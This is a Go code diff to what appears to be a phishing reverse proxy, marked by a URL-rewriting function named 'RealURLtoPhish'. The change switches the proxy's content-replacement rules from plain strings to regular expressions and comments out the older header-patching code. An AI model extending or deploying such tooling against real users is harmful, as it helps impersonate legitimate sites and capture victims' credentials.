@@ -24,6 +24,7 @@ import (
 	"net/http"
 	"net/http/httputil"
 	"net/url"
+	"regexp"
 	"strconv"
 	"strings"
 	"time"
@@ -289,14 +290,14 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 			newLocation = strings.Replace(newLocation, "https://", "http://", -1)
 		}
 
-		if len(runtime.ReplaceStrings) > 0 {
+		// if len(runtime.ReplaceStrings) > 0 {
 
-			log.Debugf("Patching Location header for static redirect")
-			for k, v := range runtime.ReplaceStrings {
-				newLocation = strings.ReplaceAll(newLocation, k, v)
-			}
+		// 	log.Debugf("Patching Location header for static redirect")
+		// 	for k, v := range runtime.ReplaceStrings {
+		// 		newLocation = strings.ReplaceAll(newLocation, k, v)
+		// 	}
 
-		}
+		// }
 
 		// Handle static location values
 		// This flag will determine if real FQDNs in the location header should
@@ -492,9 +493,22 @@ func (p *ReverseProxy) PatchURL(buffer []byte) []byte {
 	// Translate URLs
 	buffer = []byte(runtime.RegexpUrl.ReplaceAllStringFunc(string(buffer), runtime.RealURLtoPhish))
 
+	// TargetRules `json:"rules"`
+	// if len(runtime.ReplaceStrings) > 0 {
+	// 	for key, value := range runtime.ReplaceStrings {
+	// 		buffer = bytes.Replace(buffer, []byte(key), []byte(value), -1)
+	// 	}
+	// }
 	if len(runtime.ReplaceStrings) > 0 {
-		for key, value := range runtime.ReplaceStrings {
-			buffer = bytes.Replace(buffer, []byte(key), []byte(value), -1)
+		for pattern, replacement := range runtime.ReplaceStrings {
+			re, err := regexp.Compile(pattern)
+			if err != nil {
+				log.Warningf("Bad regular expression rule for replacement:\n%v\n", err)
+				continue
+			}
+			buffer = re.ReplaceAllFunc(buffer, func(match []byte) []byte {
+				return []byte(replacement)
+			})
 		}
 	}
 
